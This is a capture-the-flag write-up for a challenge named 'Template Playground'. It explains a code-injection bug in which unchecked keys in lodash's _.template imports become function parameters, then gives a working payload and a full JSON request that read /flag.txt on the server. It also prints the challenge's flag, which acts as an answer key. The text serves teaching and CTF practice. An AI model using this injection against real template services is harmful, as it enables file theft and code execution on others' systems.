# Template Playground

Flag:

```text
CPCTF{l0d4sh_t3mpl4t3_1mp0rts_1nj3ct10n}
```

The bug is not in the template body validator itself. It is in the `use` field.

The server builds the lodash imports object like this:

```js
const imports = {};
if (Array.isArray(use)) {
  for (const name of use) {
    if (typeof name === "string" && name.length < 200) {
      imports[name] = helpers[name];
    }
  }
}
```

and then passes it directly to `_.template`:

```js
const compiled = _.template(tmpl, { imports, interpolate: /<%=([\s\S]+?)%>/g });
```

In lodash, import keys become parameter names of an internal `Function(...)` call. Since `use` is not restricted to valid helper names, we can inject a default parameter expression. That expression runs before the template is rendered.

So instead of a normal helper name like `upper`, send this in `use`:

```js
x=process.mainModule.require("fs").readFileSync("/flag.txt","utf8")
```

Then use a harmless validated template body:

```text
<%= x %>
```

This passes the server-side validator because the template interpolation is only a bare identifier. But lodash evaluates the injected default parameter, reads `/flag.txt`, binds the result to `x`, and the template prints it.

The final request is:

```json
{
  "template": "<%= x %>",
  "data": {},
  "use": [
    "x=process.mainModule.require(\"fs\").readFileSync(\"/flag.txt\",\"utf8\")"
  ]
}
```

The response contains:

```text
CPCTF{l0d4sh_t3mpl4t3_1mp0rts_1nj3ct10n}
```

`solve.py` automates the request.
